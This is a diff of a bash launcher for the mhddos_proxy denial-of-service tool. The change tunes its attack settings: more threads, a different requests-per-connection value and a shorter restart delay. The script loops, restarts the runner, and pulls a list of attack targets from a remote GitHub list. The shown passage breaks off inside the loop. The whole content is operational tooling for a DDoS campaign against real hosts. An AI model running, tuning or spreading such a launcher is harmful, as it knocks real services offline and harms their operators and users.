@@ -1,14 +1,14 @@
 #!/bin/bash
 cd mhddos_proxy
 
-threads="${1:-100}"; threads="-t $threads"
-rpc="--rpc 1000"
+threads="${1:-250}"; threads="-t $threads"
+rpc="--rpc 200"
 debug="--debug"
 
 while true
 do
    pkill -f runner.py
-   sleep 21
+   sleep 7
    list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
       do
